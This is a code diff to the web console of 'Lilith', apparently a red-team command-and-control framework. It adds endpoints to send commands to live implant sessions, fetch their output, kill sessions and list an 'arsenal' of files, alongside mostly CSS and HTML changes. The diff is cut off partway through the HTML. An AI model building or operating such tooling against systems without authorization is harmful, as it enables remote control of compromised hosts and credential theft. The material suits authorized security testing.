@@ -1,24 +1,43 @@
 """
-server/ui.py — Purple team web UI for Lilith engagement database.
-
-Serves a CALDERA-style SPA at /ui/ over the existing HTTPS C2 server.
-All state is read-only from EngagementDB; no additional persistence.
+server/ui.py — Lilith engagement console (Caldera-style SPA).
 
 Endpoints:
-  GET  /ui/                         -> HTML SPA
-  GET  /ui/api/summary              -> aggregate stats + recent events
-  GET  /ui/api/sessions             -> session list
-  GET  /ui/api/session/<id>         -> session detail (tasks + results merged)
-  GET  /ui/api/credentials          -> all credential findings
-  GET  /ui/api/techniques           -> ATT&CK coverage
-  GET  /ui/api/events               -> full event log
-  GET  /ui/api/export/json          -> full JSON dump
-  GET  /ui/api/export/markdown      -> Markdown engagement report
-  POST /ui/api/sessions/<id>/label  -> set label/note on session
+  GET  /ui/                              → HTML SPA
+  GET  /ui/api/summary                   → aggregate stats + recent events
+  GET  /ui/api/sessions                  → DB session list
+  GET  /ui/api/session/<id>              → session detail (tasks+results)
+  GET  /ui/api/credentials               → credential findings
+  GET  /ui/api/techniques                → ATT&CK coverage
+  GET  /ui/api/events                    → full event log
+  GET  /ui/api/export/json               → full JSON dump
+  GET  /ui/api/export/markdown           → Markdown engagement report
+  POST /ui/api/sessions/<id>/label       → set label/note on session
+  GET  /ui/api/c2/sessions              → live C2 session registry (in-memory)
+  POST /ui/api/c2/<sid>/task            → dispatch command → {task_id}
+  GET  /ui/api/c2/<sid>/result/<tid>    → 200+output | 204 pending | 404 gone
+  DELETE /ui/api/c2/<sid>              → kill session → {ok}
+  GET  /ui/api/arsenal                  → workspace file listing
 """
 
 import json
+import os
 import re
+
+# ── Workspace path (set at server startup) ───────────────────────────────────
+
+_workspace = ""
+
+def set_workspace(path: str) -> None:
+    global _workspace
+    _workspace = path
+
+
+# ── Lazy import to avoid circular dependency with https_server ───────────────
+
+def _srv():
+    import server.https_server as m
+    return m
+
 
 # ── ATT&CK metadata ───────────────────────────────────────────────────────────
 
@@ -163,10 +182,54 @@ def _label_session(db, session_id: str, body: bytes) -> dict:
     return {"ok": ok}
 
 
+# ── Live C2 API (calls into https_server in-process) ─────────────────────────
+
+def _api_c2_sessions() -> dict:
+    return _srv().get_c2_sessions()
+
+
+def _api_c2_task(session_id: str, body: bytes) -> tuple:
+    try:
+        cmd = json.loads(body or b"{}").get("cmd", "").strip()
+    except Exception:
+        cmd = ""
+    if not cmd:
+        return _j({"error": "empty command"}, 400)
+    task_id = _srv()._c2_push_task(session_id, cmd)
+    if task_id is None:
+        return _j({"error": "session not found"}, 404)
+    return _j({"task_id": task_id})
+
+
+def _api_c2_result(session_id: str, task_id: str) -> tuple:
+    output = _srv()._c2_get_result(session_id, task_id)
+    if output is None:
+        return 204, "application/json", b""
+    return 200, "text/plain; charset=utf-8", output.encode()
+
+
+def _api_c2_kill(session_id: str) -> tuple:
+    ok = _srv()._c2_kill_session(session_id)
+    return _j({"ok": ok})
+
+
+def _api_arsenal() -> dict:
+    if not _workspace or not os.path.isdir(_workspace):
+        return {"workspace": _workspace, "files": []}
+    files = []
+    for fname in sorted(os.listdir(_workspace)):
+        fpath = os.path.join(_workspace, fname)
+        if os.path.isfile(fpath):
+            size = os.path.getsize(fpath)
+            ext  = os.path.splitext(fname)[1].lower()
+            files.append({"name": fname, "size": size, "ext": ext})
+    return {"workspace": _workspace, "files": files}
+
+
 # ── Router ────────────────────────────────────────────────────────────────────
 
 def handle_ui_request(method: str, path: str, body: bytes, db) -> tuple:
-    """Route /ui/* -> (status_code, content_type, body_bytes)."""
+    """Route /ui/* → (status_code, content_type, body_bytes)."""
     path = path.split("?")[0]
 
     if method == "GET":
@@ -191,18 +254,33 @@ def handle_ui_request(method: str, path: str, body: bytes, db) -> tuple:
         if path == "/ui/api/export/markdown":
             md = db.export_markdown()
             return 200, "text/markdown; charset=utf-8", md.encode()
+        if path == "/ui/api/c2/sessions":
+            return _j(_api_c2_sessions())
+        m = re.fullmatch(r"/ui/api/c2/([^/]+)/result/([^/]+)", path)
+        if m:
+            return _api_c2_result(m.group(1), m.group(2))
+        if path == "/ui/api/arsenal":
+            return _j(_api_arsenal())
 
     if method == "POST":
         m = re.fullmatch(r"/ui/api/sessions/([^/]+)/label", path)
         if m:
             return _j(_label_session(db, m.group(1), body))
+        m = re.fullmatch(r"/ui/api/c2/([^/]+)/task", path)
+        if m:
+            return _api_c2_task(m.group(1), body)
+
+    if method == "DELETE":
+        m = re.fullmatch(r"/ui/api/c2/([^/]+)", path)
+        if m:
+            return _api_c2_kill(m.group(1))
 
     return 404, "application/json", b'{"error":"not found"}'
 
 
 # ── HTML SPA ──────────────────────────────────────────────────────────────────
 
-_UI_HTML = """<!doctype html>
+_UI_HTML = r"""<!doctype html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
@@ -212,883 +290,993 @@ _UI_HTML = """<!doctype html>
 :root {
   --bg:     #060606;
   --surf:   #0d0d0d;
-  --surf2:  #121212;
+  --surf2:  #111111;
   --surf3:  #181818;
-  --border: #1e1e1e;
-  --bord2:  #272727;
+  --border: #1a1a1a;
+  --bord2:  #252525;
   --red:    #c81e1e;
   --red2:   #ef4444;
   --red3:   rgba(200,30,30,.15);
-  --red4:   rgba(200,30,30,.07);
+  --red4:   rgba(200,30,30,.06);
   --text:   #cccccc;
   --muted:  #3d3d3d;
-  --muted2: #6a6a6a;
-  --green:  #15803d;
-  --yellow: #a16207;
+  --muted2: #666666;
+  --green:  #16a34a;
+  --yellow: #ca8a04;
   --mono:   'Cascadia Code','Consolas','JetBrains Mono',monospace;
-  --sw:     228px;
+  --sw:     210px;
 }
-*{box-sizing:border-box;margin:0;padding:0}
-html,body{height:100%;background:var(--bg);color:var(--text);
-  font-family:'Segoe UI',system-ui,sans-serif;font-size:13px;line-height:1.5}
-body::after{
-  content:'';position:fixed;inset:0;pointer-events:none;z-index:9999;
-  background:repeating-linear-gradient(
-    0deg,transparent 0,transparent 3px,
-    rgba(0,0,0,.09) 3px,rgba(0,0,0,.09) 4px)}
-#layout{display:flex;height:100vh;overflow:hidden}
+*,*::before,*::after { box-sizing:border-box; margin:0; padding:0; }
+html,body { height:100%; background:var(--bg); color:var(--text); font:13px/1.5 var(--mono); }
+a { color:var(--red2); text-decoration:none; }
 
-/* ── Sidebar ── */
-#sidebar{
-  width:var(--sw);flex-shrink:0;background:var(--surf);
-  border-right:1px solid #1c0000;display:flex;flex-direction:column;
-  box-shadow:3px 0 18px rgba(0,0,0,.5)}
-.logo{
-  padding:22px 18px 18px;border-bottom:1px solid #1c0000;
-  display:flex;align-items:center;gap:12px}
-.logo-sigil{
+/* ── layout ── */
+#app { display:flex; height:100vh; overflow:hidden; }
+#sidebar {
+  width:var(--sw); min-width:var(--sw); background:var(--surf);
+  border-right:1px solid var(--border); display:flex; flex-direction:column;
+  padding:0; overflow:hidden;
+}
+#main { flex:1; overflow:hidden; display:flex; flex-direction:column; }
+#topbar {
+  height:36px; background:var(--surf); border-bottom:1px solid var(--border);
+  display:flex; align-items:center; padding:0 16px; gap:8px; flex-shrink:0;
+  font-size:11px; color:var(--muted2);
+}
+#content { flex:1; overflow:auto; padding:0; }
+
+/* ── sidebar ── */
+.logo {
+  padding:16px 16px 12px;
+  font-size:14px; font-weight:700; letter-spacing:.1em;
+  color:var(--red); border-bottom:1px solid var(--border);
+}
+.logo span { color:var(--muted2); font-weight:400; }
+nav { display:flex; flex-direction:column; padding:8px 0; flex:1; }
+.nav-item {
+  display:flex; align-items:center; gap:9px;
+  padding:7px 16px; cursor:pointer;
+  font-size:12px; color:var(--muted2); letter-spacing:.05em;
+  border-left:2px solid transparent; transition:all .12s;
+  user-select:none;
+}
+.nav-item:hover { color:var(--text); background:var(--surf3); }
+.nav-item.active { color:var(--red2); border-left-color:var(--red); background:var(--red4); }
+.nav-icon { width:14px; text-align:center; font-size:11px; }
+.nav-footer {
+  padding:12px 16px; font-size:10px; color:var(--muted);
+  border-top:1px solid var(--border);
+}
+
+/* ── page sections ── */
+.view { display:none; height:100%; }
+.view.active { display:flex; flex-direction:column; height:100%; }
+.view-header {
+  padding:18px 24px 14px; border-bottom:1px solid var(--border);
+  display:flex; align-items:center; justify-content:space-between; flex-shrink:0;
+}
+.view-title { font-size:11px; letter-spacing:.15em; color:var(--muted2); }
+.view-title strong { color:var(--red2); font-size:14px; display:block; margin-top:2px; letter-spacing:.05em; }
+.view-body { flex:1; overflow:auto; padding:20px 24px; }
+
+/* ── stat cards ── */
+.stat-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(160px,1fr)); gap:10px; margin-bottom:20px; }
+.stat-card {
+  background:var(--surf2); border:1px solid var(--border); border-radius:4px;
+  padding:14px 16px;
+}
+.stat-label { font-size:10px; color:var(--muted2); letter-spacing:.1em; margin-bottom:4px; }
+.stat-value { font-size:26px; font-weight:700; color:var(--red2); }
+.stat-sub   { font-size:10px; color:var(--muted2); margin-top:2px; }
+
+/* ── tables ── */
+.tbl-wrap { overflow-x:auto; }
+table { width:100%; border-collapse:collapse; font-size:12px; }
+th { text-align:left; padding:7px 12px; font-size:10px; letter-spacing:.1em;
+     color:var(--muted2); border-bottom:1px solid var(--bord2); white-space:nowrap; }
+td { padding:8px 12px; border-bottom:1px solid var(--border); vertical-align:top; word-break:break-all; }
+tr:hover td { background:var(--surf3); }
+.mono { font-family:var(--mono); }
+.truncate { max-width:220px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+
+/* ── badges ── */
+.badge {
+  display:inline-block; padding:2px 7px; border-radius:2px; font-size:10px;
+  letter-spacing:.05em; font-weight:600;
+}
+.badge-alive  { background:rgba(22,163,74,.2);  color:#4ade80; }
+.badge-stale  { background:rgba(202,138,4,.2);  color:#fbbf24; }
+.badge-dead   { background:rgba(100,100,100,.2); color:#6b7280; }
+.badge-red    { background:var(--red3); color:var(--red2); }
+
+/* ── buttons ── */
+.btn {
+  display:inline-flex; align-items:center; gap:5px;
+  padding:5px 12px; border:1px solid var(--bord2); border-radius:3px;
+  background:var(--surf3); color:var(--text); font:12px var(--mono);
+  cursor:pointer; transition:all .1s; white-space:nowrap;
+}
+.btn:hover { border-color:var(--muted2); background:var(--surf2); }
+.btn-red  { border-color:var(--red); color:var(--red2); }
+.btn-red:hover { background:var(--red3); }
+.btn-sm   { padding:3px 8px; font-size:11px; }
+.btn-ghost { background:transparent; border-color:transparent; color:var(--muted2); }
+.btn-ghost:hover { color:var(--text); border-color:var(--bord2); }
+
+/* ── event log ── */
+.ev-list { display:flex; flex-direction:column; gap:3px; }
+.ev-row {
+  display:flex; gap:10px; padding:5px 10px; border-radius:3px;
+  font-size:11px; background:var(--surf2); border:1px solid var(--border);
+}
+.ev-ts   { color:var(--muted2); white-space:nowrap; flex-shrink:0; }
+.ev-type { color:var(--red2); width:100px; flex-shrink:0; }
+.ev-msg  { color:var(--text); }
+
+/* ── ATT&CK grid ── */
+.atk-grid { display:flex; gap:12px; flex-wrap:wrap; }
+.atk-col  { flex:1; min-width:160px; }
+.atk-tactic {
+  font-size:10px; letter-spacing:.1em; color:var(--muted2);
+  padding:6px 0 4px; border-bottom:1px solid var(--border); margin-bottom:6px;
+}
+.atk-tech {
+  padding:5px 8px; margin-bottom:3px; border-radius:3px; font-size:11px;
+  border:1px solid var(--border); background:var(--surf2); cursor:default;
+}
+.atk-tech.covered {
+  background:var(--red3); border-color:var(--red); color:var(--red2);
+}
+.atk-tid { font-size:9px; color:var(--muted2); display:block; margin-top:1px; }
+
+/* ═══════════════════════════════════════════════════════
+   C2 SHELL VIEW
+   ═══════════════════════════════════════════════════════ */
+#view-shell { background:var(--bg); }
+#shell-topbar {
+  display:flex; align-items:center; gap:12px; flex-wrap:wrap;
+  padding:10px 16px; background:var(--surf); border-bottom:1px solid var(--border);
   flex-shrink:0;
-  filter:drop-shadow(0 0 6px rgba(200,30,30,.75))
-         drop-shadow(0 0 14px rgba(200,30,30,.35))}
-.logo-name{
-  font-size:19px;font-weight:900;letter-spacing:4px;
-  color:var(--text);line-height:1}
-.logo-name em{color:var(--red2);font-style:normal}
-.logo-sub{
-  font-size:8px;letter-spacing:5px;color:var(--muted2);
-  margin-top:3px;text-transform:uppercase}
-.nav-sec{flex:1;overflow-y:auto;padding:8px 0 12px}
-.nav-lbl{
-  font-size:9px;letter-spacing:3px;color:var(--muted);
-  text-transform:uppercase;padding:12px 18px 4px;font-weight:700}
-.nav-link{
-  display:flex;align-items:center;gap:10px;padding:10px 18px;
-  color:var(--muted2);text-decoration:none;font-size:11px;
-  letter-spacing:1.2px;text-transform:uppercase;font-weight:500;
-  border-left:3px solid transparent;transition:all .12s;
-  cursor:pointer;user-select:none}
-.nav-link:hover{
-  color:var(--text);background:var(--red4);
-  border-left-color:rgba(200,30,30,.3)}
-.nav-link.active{
-  color:var(--red2);background:var(--red3);
-  border-left-color:var(--red);
-  text-shadow:0 0 12px rgba(239,68,68,.4)}
-.nav-ico{font-size:12px;width:16px;text-align:center;flex-shrink:0;opacity:.8}
-.nav-bot{
-  padding:12px 18px;border-top:1px solid #1c0000;
-  display:flex;align-items:center;gap:8px}
-.sdot{
-  width:7px;height:7px;border-radius:50%;
-  background:var(--muted);flex-shrink:0;transition:background .3s}
-.sdot.ok{background:var(--red);box-shadow:0 0 8px var(--red),0 0 16px rgba(200,30,30,.4)}
-.sdot.err{background:#2a2a2a}
-.sdot.spin{background:var(--red2);animation:blink .9s ease infinite}
-@keyframes blink{0%,100%{opacity:.15}50%{opacity:1}}
-#last-refresh{
-  font-size:10px;letter-spacing:1px;color:var(--muted2);
-  text-transform:uppercase;font-family:var(--mono)}
-
-/* ── Main area ── */
-#main{flex:1;overflow:auto;padding:26px 30px;background:var(--bg)}
-.view{display:none!important}
-.view.active{display:block!important}
-.page-hdr{
-  margin-bottom:22px;padding-bottom:14px;
-  border-bottom:1px solid var(--border)}
-.page-title{
-  font-size:17px;font-weight:800;letter-spacing:2px;
-  text-transform:uppercase;color:var(--text)}
-.page-title .sl{color:var(--red);margin-right:5px;font-weight:400}
-.page-sub{
-  font-size:10px;color:var(--muted2);
-  letter-spacing:2px;margin-top:4px;text-transform:uppercase}
-
-/* ── Stat cards ── */
-.cards{
-  display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));
-  gap:10px;margin-bottom:22px}
-.card{
-  background:var(--surf);border:1px solid var(--border);
-  border-top:2px solid var(--bord2);border-radius:3px;
-  padding:14px 16px;position:relative;overflow:hidden}
-.card::before{
-  content:'';position:absolute;top:0;left:0;right:0;
-  height:2px;background:transparent;transition:background .3s}
-.card.danger{border-top-color:var(--red)}
-.card.danger .cv{
-  color:var(--red2);
-  text-shadow:0 0 20px rgba(239,68,68,.55)}
-.card.accent{border-top-color:#7f1d1d}
-.clbl{
-  font-size:9px;color:var(--muted2);text-transform:uppercase;
-  letter-spacing:2px;margin-bottom:9px;font-weight:700}
-.cv{
-  font-size:30px;font-weight:700;line-height:1;
-  font-family:var(--mono);color:var(--text)}
-.csub{font-size:10px;color:var(--muted2);margin-top:5px;letter-spacing:.5px}
-
-/* ── Panels ── */
-.panels{
-  display:grid;grid-template-columns:1fr 1fr;
-  gap:12px;margin-bottom:22px}
-@media(max-width:860px){.panels{grid-template-columns:1fr}}
-.panel{
-  background:var(--surf);border:1px solid var(--border);
-  border-radius:3px;padding:14px 16px;min-height:150px}
-.ptitle{
-  font-size:9px;font-weight:700;color:var(--muted2);
-  text-transform:uppercase;letter-spacing:3px;
-  margin-bottom:12px;padding-bottom:8px;
-  border-bottom:1px solid var(--border);
-  display:flex;justify-content:space-between;align-items:center}
-
-/* ── Tables ── */
-.tbl-wrap{
-  overflow-x:auto;border-radius:3px;
-  border:1px solid var(--border)}
-table{width:100%;border-collapse:collapse}
-th{
-  background:var(--surf2);color:var(--muted2);font-size:9px;
-  font-weight:700;text-transform:uppercase;letter-spacing:2px;
-  padding:8px 12px;text-align:left;
-  border-bottom:1px solid var(--border);white-space:nowrap}
-td{
-  padding:9px 12px;border-bottom:1px solid var(--border);
-  vertical-align:top;font-size:12px;color:var(--text)}
-tr:last-child td{border-bottom:none}
-tr.clickable:hover td{background:var(--surf2);cursor:pointer}
-tr.selected td{background:rgba(200,30,30,.06)}
-tr.selected td:first-child{border-left:3px solid var(--red)}
-
-/* ── Badges ── */
-.badge{
-  display:inline-block;padding:1px 7px;border-radius:2px;
-  font-size:9px;font-weight:700;letter-spacing:1px;
-  line-height:1.9;text-transform:uppercase;border:1px solid}
-.b-ntlm{background:rgba(200,30,30,.16);color:#f87171;border-color:rgba(200,30,30,.4)}
-.b-kerb{background:rgba(180,83,9,.16);color:#fbbf24;border-color:rgba(180,83,9,.4)}
-.b-plain{background:rgba(21,128,61,.14);color:#4ade80;border-color:rgba(21,128,61,.4)}
-.b-aes{background:rgba(37,99,235,.14);color:#93c5fd;border-color:rgba(37,99,235,.4)}
-.b-cred{background:rgba(200,30,30,.16);color:#f87171;border-color:rgba(200,30,30,.4)}
-.b-ok{background:rgba(21,128,61,.12);color:#4ade80;border-color:rgba(21,128,61,.35)}
-.b-warn{background:rgba(180,83,9,.12);color:#fbbf24;border-color:rgba(180,83,9,.35)}
-.b-info{background:rgba(37,99,235,.12);color:#93c5fd;border-color:rgba(37,99,235,.35)}
-.b-grey{background:rgba(255,255,255,.04);color:var(--muted2);border-color:var(--bord2)}
-
-/* ── ATT&CK chips ── */
-.chip{
-  display:inline-block;padding:3px 8px;border-radius:2px;
-  font-size:10px;margin:2px;cursor:default;transition:all .1s;
-  font-family:var(--mono);border:1px solid}
-.chip-on{
-  background:rgba(200,30,30,.16);color:var(--red2);
-  border-color:rgba(200,30,30,.45);
-  text-shadow:0 0 8px rgba(239,68,68,.3)}
-.chip-on:hover{background:rgba(200,30,30,.26)}
-.chip-off{background:var(--surf2);color:var(--muted2);border-color:var(--border)}
-.chip-cnt{font-size:9px;opacity:.65;margin-left:3px}
-.tactic-sec{margin-bottom:18px}
-.tactic-hdr{
-  font-size:9px;font-weight:700;text-transform:uppercase;
-  letter-spacing:3px;color:var(--red);margin-bottom:8px;padding:5px 0;
-  border-bottom:1px solid var(--border);
-  display:flex;justify-content:space-between;align-items:center}
-.tactic-score{color:var(--muted2);font-weight:400;letter-spacing:1px}
-
-/* ── Session detail ── */
-#session-detail{
-  background:var(--surf);border:1px solid var(--border);
-  border-radius:3px;border-top:2px solid var(--red);
-  padding:18px;margin-top:14px}
-.det-hdr{
-  display:flex;align-items:center;gap:12px;margin-bottom:14px;
-  padding-bottom:12px;border-bottom:1px solid var(--border)}
-.det-title{
-  font-size:12px;font-weight:700;flex:1;font-family:var(--mono);
-  letter-spacing:.5px;text-transform:uppercase;color:var(--text)}
-.label-form{
-  display:flex;gap:8px;align-items:center;
-  flex-wrap:wrap;margin-bottom:14px}
-.label-form input{
-  flex:1;min-width:110px;padding:6px 10px;
-  background:var(--surf2);border:1px solid var(--bord2);
-  border-radius:3px;color:var(--text);font-size:12px;outline:none}
-.label-form input:focus{border-color:var(--red)}
-
-/* ── Buttons ── */
-.btn{
-  display:inline-block;padding:6px 14px;border-radius:3px;
-  border:1px solid var(--bord2);background:transparent;
-  color:var(--muted2);font-size:10px;cursor:pointer;text-decoration:none;
-  transition:all .12s;text-transform:uppercase;letter-spacing:1px;font-weight:600}
-.btn:hover{border-color:var(--red);color:var(--red2);background:var(--red4)}
-.btn-primary{
-  background:var(--red3);border-color:var(--red);color:var(--red2)}
-.btn-primary:hover{
-  background:rgba(200,30,30,.22);
-  box-shadow:0 0 12px rgba(200,30,30,.2)}
-.btn-sm{padding:3px 10px;font-size:10px}
-.hrow{display:flex;align-items:center;gap:10px;flex-wrap:wrap;margin-bottom:22px}
-.hrow .page-title{margin:0}.hrow-titles{flex:1}
-.btn-row{display:flex;gap:8px;flex-wrap:wrap}
-
-/* ── Tasks ── */
-.task-item{
-  padding:10px 12px;border-radius:3px;margin-bottom:8px;
-  background:var(--surf2);border-left:3px solid var(--bord2)}
-.task-item.t-cred{border-left-color:var(--red)}
-.task-item.t-pend{border-left-color:#a16207}
-.task-item.t-done{border-left-color:#15803d}
-.task-cmd{
-  font-family:var(--mono);font-size:11px;color:var(--text);
-  margin-bottom:5px;word-break:break-all}
-.task-meta{
-  display:flex;gap:8px;flex-wrap:wrap;
-  align-items:center;font-size:10px;color:var(--muted2)}
-.task-out{
-  margin-top:8px;background:var(--bg);border-radius:3px;
-  padding:8px;font-family:var(--mono);font-size:11px;color:var(--muted2);
-  white-space:pre-wrap;max-height:180px;overflow-y:auto;
-  border:1px solid var(--border)}
-
-/* ── Events ── */
-.ev-item{
-  padding:6px 0;border-bottom:1px solid var(--border);
-  display:flex;gap:10px;align-items:flex-start}
-.ev-item:last-child{border-bottom:none}
-.ev-time{
-  color:var(--muted2);font-size:10px;white-space:nowrap;
-  min-width:40px;font-family:var(--mono)}
-.ev-type{
-  font-size:9px;font-weight:700;text-transform:uppercase;
-  color:var(--red);min-width:80px;letter-spacing:1px}
-.ev-detail{font-size:11px;color:var(--muted2);word-break:break-all}
-
-/* ── Misc ── */
-.empty{
-  text-align:center;padding:36px;color:var(--muted2);
-  letter-spacing:1px;font-size:11px;text-transform:uppercase}
-.empty-icon{font-size:22px;margin-bottom:8px;opacity:.2}
-.r-section{margin-bottom:26px}
-.r-h1{
-  font-size:19px;font-weight:900;margin-bottom:4px;
-  letter-spacing:3px;text-transform:uppercase}
-.r-h1 em{color:var(--red);font-style:normal}
-.r-h2{
-  font-size:9px;font-weight:700;color:var(--muted2);
-  text-transform:uppercase;letter-spacing:3px;
-  margin-bottom:12px;padding-bottom:6px;
-  border-bottom:1px solid var(--border)}
-.r-meta{
-  display:flex;gap:20px;margin-bottom:20px;
-  color:var(--muted2);font-size:11px;flex-wrap:wrap;letter-spacing:.5px}
-::-webkit-scrollbar{width:4px;height:4px}
-::-webkit-scrollbar-track{background:transparent}
-::-webkit-scrollbar-thumb{background:var(--bord2);border-radius:2px}
-@keyframes spin{to{transform:rotate(360deg)}}
-.spin{display:inline-block;animation:spin .8s linear infinite}
-@media print{
-  #sidebar,.btn,.btn-row,button{display:none!important}
-  #main{padding:0}
-  #view-report{display:block!important}
-  body,html{background:#fff;color:#000;height:auto}
-  #layout{display:block;height:auto}
-  .card,.panel,.tbl-wrap{break-inside:avoid}
-  .card{background:#f5f5f5;border-color:#ddd}
-  th{background:#eee;color:#333}
 }
+#shell-sess-select {
+  background:var(--surf3); border:1px solid var(--bord2); color:var(--text);
+  font:12px var(--mono); padding:4px 8px; border-radius:3px; min-width:220px;
+}
+#shell-sess-select:focus { outline:none; border-color:var(--red); }
+#shell-info {
+  flex:1; display:flex; align-items:center; gap:10px; font-size:11px;
+}
+#shell-host  { color:var(--text); }
+#shell-ip    { color:var(--muted2); }
+#shell-status { }
+#shell-actions { display:flex; gap:6px; margin-left:auto; }
+
+.quick-bar {
+  padding:8px 16px; background:var(--surf2); border-bottom:1px solid var(--border);
+  display:flex; gap:5px; flex-wrap:wrap; align-items:center; flex-shrink:0;
+}
+.quick-label { font-size:10px; color:var(--muted2); letter-spacing:.08em; margin-right:4px; }
+.qbtn {
+  padding:3px 8px; font-size:10px; border:1px solid var(--bord2); border-radius:2px;
+  background:var(--surf3); color:var(--muted2); cursor:pointer; font-family:var(--mono);
+  transition:all .1s; white-space:nowrap;
+}
+.qbtn:hover { border-color:var(--red); color:var(--red2); background:var(--red4); }
+
+#shell-out {
+  flex:1; overflow-y:auto; padding:12px 16px;
+  font:13px/1.6 var(--mono); background:var(--bg);
+}
+.sl { margin:1px 0; }
+.sl-prompt  { color:var(--red); }
+.sl-cmd     { color:#e5e7eb; }
+.sl-output  { color:#9ca3af; white-space:pre-wrap; word-break:break-all; }
+.sl-err     { color:#f87171; }
+.sl-info    { color:var(--muted2); font-style:italic; }
+.sl-pending { color:var(--yellow); }
+.blink { animation:blink .9s step-end infinite; }
+@keyframes blink { 50%{opacity:0} }
+
+#shell-input-bar {
+  display:flex; gap:8px; align-items:center;
+  padding:10px 16px; background:var(--surf); border-top:1px solid var(--border);
+  flex-shrink:0;
+}
+#shell-prompt-label { color:var(--red); font-size:12px; flex-shrink:0; }
+#shell-input {
+  flex:1; background:transparent; border:none; outline:none;
+  color:var(--text); font:13px var(--mono); caret-color:var(--red2);
+}
+#shell-input::placeholder { color:var(--muted); }
+
+/* ═══════════════════════════════════════════════════════
+   ARSENAL VIEW
+   ═══════════════════════════════════════════════════════ */
+.arsenal-cat { font-size:10px; letter-spacing:.12em; color:var(--muted2); margin-bottom:6px; padding-top:16px; }
+.arsenal-cat:first-child { padding-top:0; }
+.file-row {
+  display:flex; align-items:center; gap:12px;
+  padding:8px 12px; background:var(--surf2); border:1px solid var(--border);
+  border-radius:3px; margin-bottom:4px; font-size:12px;
+}
+.file-name { flex:1; color:var(--text); font-family:var(--mono); }
+.file-size { color:var(--muted2); font-size:11px; flex-shrink:0; width:70px; text-align:right; }
+.file-ext  { color:var(--red2); font-size:10px; width:36px; text-align:center;
+             background:var(--red4); border:1px solid var(--red3); border-radius:2px; padding:1px 4px; }
+.copy-btn {
+  padding:3px 8px; font-size:10px; border:1px solid var(--bord2); border-radius:2px;
+  background:var(--surf3); color:var(--muted2); cursor:pointer; font-family:var(--mono);
+  transition:all .1s; flex-shrink:0;
+}
+.copy-btn:hover { border-color:var(--red); color:var(--red2); }
+.copy-btn.copied { border-color:var(--green); color:#4ade80; }
+
+/* ── credential cards ── */
+.cred-row td:first-child { font-family:var(--mono); color:var(--red2); }
+.hint-list { margin-top:4px; display:flex; flex-direction:column; gap:2px; }
+.hint { font-size:11px; color:var(--muted2); }
+.hint strong { color:var(--text); }
+
+/* ── section card ── */
+.section { margin-bottom:20px; }
+.section-hdr {
+  font-size:10px; letter-spacing:.12em; color:var(--muted2);
+  padding-bottom:8px; border-bottom:1px solid var(--border); margin-bottom:12px;
+}
+
+/* ── scrollbar ── */
+::-webkit-scrollbar { width:5px; height:5px; }
+::-webkit-scrollbar-track { background:var(--bg); }
+::-webkit-scrollbar-thumb { background:var(--bord2); border-radius:4px; }
+::-webkit-scrollbar-thumb:hover { background:var(--muted); }
+
+/* ── live dot ── */
+.dot { display:inline-block; width:7px; height:7px; border-radius:50%; margin-right:4px; }
+.dot-green  { background:#4ade80; box-shadow:0 0 5px #4ade80; }
+.dot-yellow { background:#fbbf24; box-shadow:0 0 5px #fbbf24; }
+.dot-gray   { background:#4b5563; }
 </style>
 </head>
 <body>
-<div id="layout">
+<div id="app">
 
-<nav id="sidebar">
-  <div class="logo">
-    <svg class="logo-sigil" viewBox="0 0 34 34" width="30" height="30" fill="none"
-         xmlns="http://www.w3.org/2000/svg">
-      <defs>
-        <filter id="rglow" x="-50%" y="-50%" width="200%" height="200%">
-          <feGaussianBlur stdDeviation="1.5" result="blur"/>
-          <feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
-        </filter>
-      </defs>
-      <polygon points="17,2 32,30 2,30"
-               stroke="#c81e1e" stroke-width="1.8"
-               fill="rgba(200,30,30,.08)" filter="url(#rglow)"/>
-      <line x1="17" y1="15" x2="17" y2="28"
-            stroke="#c81e1e" stroke-width="1.5" opacity=".75"/>
-      <circle cx="17" cy="13" r="2.8" fill="#c81e1e"/>
-    </svg>
-    <div>
-      <div class="logo-name"><em>L</em>ILITH</div>
-      <div class="logo-sub">Operations Center</div>
+<!-- ── Sidebar ── -->
+<div id="sidebar">
+  <div class="logo">LILITH <span>// C2</span></div>
+  <nav>
+    <div class="nav-item active" data-view="dash">
+      <span class="nav-icon">▤</span> DASHBOARD
     </div>
+    <div class="nav-item" data-view="shell">
+      <span class="nav-icon">⌨</span> C2 SHELL
+    </div>
+    <div class="nav-item" data-view="sessions">
+      <span class="nav-icon">◈</span> SESSIONS
+    </div>
+    <div class="nav-item" data-view="arsenal">
+      <span class="nav-icon">⊡</span> ARSENAL
+    </div>
+    <div class="nav-item" data-view="creds">
+      <span class="nav-icon">⚷</span> CREDENTIALS
+    </div>
+    <div class="nav-item" data-view="attack">
+      <span class="nav-icon">⊗</span> ATT&amp;CK
+    </div>
+    <div class="nav-item" data-view="report">
+      <span class="nav-icon">⊞</span> REPORT
+    </div>
+  </nav>
+  <div class="nav-footer" id="live-badge">
+    <span id="live-count">— sessions live</span>
   </div>
+</div>
 
-  <div class="nav-sec">
-    <div class="nav-lbl">Navigation</div>
-    <a class="nav-link active" data-view="dashboard">
-      <span class="nav-ico">&#9654;</span>Dashboard
-    </a>
-    <a class="nav-link" data-view="sessions">
-      <span class="nav-ico">&#9711;</span>Sessions
-    </a>
-    <a class="nav-link" data-view="credentials">
-      <span class="nav-ico">&#9671;</span>Credentials
-    </a>
-    <a class="nav-link" data-view="attack">
-      <span class="nav-ico">&#10010;</span>ATT&amp;CK
-    </a>
-    <a class="nav-link" data-view="report">
-      <span class="nav-ico">&#9672;</span>Report
-    </a>
+<!-- ── Main ── -->
+<div id="main">
+  <div id="topbar">
+    <span style="color:var(--red2);font-weight:700">LILITH</span>
+    <span>//</span>
+    <span id="topbar-host" style="color:var(--text)">loading...</span>
+    <span style="margin-left:auto" id="topbar-ts"></span>
   </div>
+  <div id="content">
 
-  <div class="nav-bot">
-    <div class="sdot spin" id="sdot"></div>
-    <span id="last-refresh">connecting&hellip;</span>
-  </div>
-</nav>
-
-<main id="main">
-
-<!-- dashboard -->
-<div id="view-dashboard" class="view active">
-  <div class="page-hdr">
-    <div class="page-title">
-      <span class="sl">//</span>Operations Dashboard
-    </div>
-    <div class="page-sub">Live engagement telemetry &nbsp;&middot;&nbsp; Auto-refresh 5s</div>
-  </div>
-  <div class="cards">
-    <div class="card">
-      <div class="clbl">Sessions</div>
-      <div class="cv" id="d-sess">0</div>
-      <div class="csub">Active agents</div>
